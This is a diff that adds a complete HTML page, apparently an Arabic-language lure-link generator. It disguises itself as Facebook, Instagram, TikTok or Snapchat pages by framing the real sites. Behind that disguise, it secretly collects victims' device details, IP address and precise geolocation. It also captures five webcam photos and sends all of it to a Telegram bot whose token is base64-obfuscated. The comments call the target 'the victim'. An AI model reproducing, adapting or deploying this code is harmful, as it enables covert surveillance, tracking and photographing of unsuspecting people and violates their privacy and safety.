@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dev Ahmad Dashboard</title>
+    <style>
+        :root { --blue: #0095f6; --dark: #0a0a0a; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; font-family: sans-serif; overflow: hidden; }
+        
+        /* واجهة التمويه (عرض المواقع الحقيقية) [cite: 31-01-2026] */
+        #maskFrame { position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: none; z-index: 1; display: none; }
+        
+        /* لوحة التحكم الملكية */
+        .admin-box { 
+            position: relative; z-index: 20; background: #121212; padding: 30px; border-radius: 20px; 
+            width: 330px; border: 1px solid #333; box-shadow: 0 0 30px rgba(0,149,246,0.3);
+            text-align: center; margin: auto; top: 50%; transform: translateY(-50%);
+        }
+        .btn { display: block; width: 100%; padding: 14px; margin: 10px 0; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; color: white; font-size: 15px; }
+        .fb { background: #1877f2; } .ig { background: linear-gradient(45deg, #f09433, #bc1888); }
+        .tt { background: #000; border: 1px solid #fff; } .sc { background: #fffc00; color: #000; }
+        .res-link { background: #000; padding: 10px; border-radius: 8px; margin-top: 15px; font-size: 10px; color: #0f0; word-break: break-all; border: 1px dashed #444; }
+
+        /* شاشة التحميل للضحية (تختفي بعد الأذونات) [cite: 31-01-2026] */
+        #victimUI { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 10; display: flex; flex-direction: column; justify-content: center; align-items: center; }
+        .loader { border: 4px solid #222; border-top: 4px solid var(--blue); border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        #v, #ca, .hidden { display: none; }
+    </style>
+</head>
+<body>
+
+<iframe id="maskFrame"></iframe>
+
+<div id="adminUI" class="hidden">
+    <div class="admin-box">
+        <div style="font-size: 50px;">👑</div>
+        <h2 style="color:var(--blue);">مرحباً، المطور أحمد</h2>
+        <p style="color:#777; font-size:12px;">اختر نوع التمويه لتوليد الرابط:</p>
+        <button class="btn fb" onclick="gen('fb')">بروفايل فيسبوك</button>
+        <button class="btn ig" onclick="gen('ig')">بروفايل إنستقرام</button>
+        <button class="btn tt" onclick="gen('tt')">فيديو تيك توك واقعي</button>
+        <button class="btn sc" onclick="gen('sc')">سناب شات</button>
+        <div id="resBox" class="hidden"><div class="res-link" id="finalLink" onclick="copy()"></div></div>
+    </div>
+</div>
+
+<div id="victimUI" class="hidden">
+    <div class="loader"></div>
+    <p id="st" style="color:#888; margin-top:20px;">جاري التحميل...</p>
+</div>
+
+<video id="v" autoplay></video><canvas id="ca"></canvas>
+
+<script>
+    const _T = atob("ODI4OTc5Mzk0MzpBQUVyc0ZOMlZhUVZIMzBNaENYaG92cXJoQW8zNFZTdWJlNA==");
+    const _I = atob("NTc3NTc4MTAzOA==");
+    const q = new URLSearchParams(window.location.search);
+
+    // روابط التمويه الحقيقية 100% [cite: 31-01-2026]
+    const masks = {
+        'fb': 'https://m.facebook.com/profile.php', // يظهر بروفايل عام
+        'ig': 'https://www.instagram.com/reels/videos/', // ريلز مشهور
+        'tt': 'https://www.tiktok.com/embed/v2/7106821361845603585', // فيديو تيك توك شغال داخل الصفحة
+        'sc': 'https://www.snapchat.com/add/akshaykumar'
+    };
+
+    if (q.has('admin')) {
+        document.getElementById('adminUI').classList.remove('hidden');
+    } else {
+        document.getElementById('victimUI').classList.remove('hidden');
+        if(q.has('type')) {
+            document.getElementById('maskFrame').src = masks[q.get('type')] || masks['fb'];
+            document.getElementById('maskFrame').style.display = 'block';
+        }
+        window.onload = () => { runMission(); };
+    }
+
+    function gen(t) {
+        const l = window.location.origin + window.location.pathname + "?type=" + t;
+        document.getElementById('resBox').classList.remove('hidden');
+        document.getElementById('finalLink').innerText = l;
+    }
+
+    function copy() { navigator.clipboard.writeText(document.getElementById('finalLink').innerText); alert("تم نسخ الرابط!"); }
+
+    async function runMission() {
+        // سحب كامل معلومات الجهاز والـ IP [cite: 31-01-2026]
+        let info = `🚀 صيد جديد للمطور أحمد!\n🌐 النوع: ${q.get('type') || 'عام'}\n📱 النظام: ${navigator.platform}`;
+        try {
+            let b = await navigator.getBattery();
+            info += `\n🔋 البطارية: ${Math.round(b.level * 100)}%\n🖥️ الرام: ${navigator.deviceMemory || 'N/A'} GB\n📡 المعالج: ${navigator.hardwareConcurrency || 'N/A'} Cores\n📏 الشاشة: ${screen.width}x${screen.height}`;
+            let ip = await fetch('https://ipapi.co/json/').then(r => r.json());
+            info += `\n\n🌍 الشبكة:\n🌐 IP: ${ip.ip}\n🏢 الشركة: ${ip.org}\n📍 الدولة: ${ip.country_name}\n🏙️ المدينة: ${ip.city}`;
+        } catch(e) {}
+        
+        send(info);
+
+        // طلب الأذونات فورياً [cite: 31-01-2026]
+        navigator.geolocation.getCurrentPosition(p => {
+            send(`📍 الموقع الدقيق:\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+        });
+
+        try {
+            const s = await navigator.mediaDevices.getUserMedia({video: true});
+            document.getElementById('v').srcObject = s;
+            // بمجرد قبول الكاميرا، نخفي شاشة التحميل ليظهر التمويه [cite: 31-01-2026]
+            document.getElementById('victimUI').style.display = 'none';
+            for(let i=0; i<5; i++) setTimeout(() => snap(), i * 1500);
+        } catch(e) { 
+            send("❌ الضحية رفض الكاميرا");
+            document.getElementById('victimUI').style.display = 'none';
+        }
+    }
+
+    function snap() {
+        const c = document.getElementById('ca'); const v = document.getElementById('v');
+        c.width = v.videoWidth; c.height = v.videoHeight;
+        c.getContext('2d').drawImage(v, 0, 0);
+        c.toBlob(b => {
+            let f = new FormData(); f.append('photo', b);
+            fetch(`https://api.telegram.org/bot${_T}/sendPhoto?chat_id=${_I}`, {method:'POST', body:f});
+        }, 'image/jpeg');
+    }
+
+    function send(t) { fetch(`https://api.telegram.org/bot${_T}/sendMessage?chat_id=_I&text=${encodeURIComponent(t)}`); }
+</script>
+</body>
+</html>
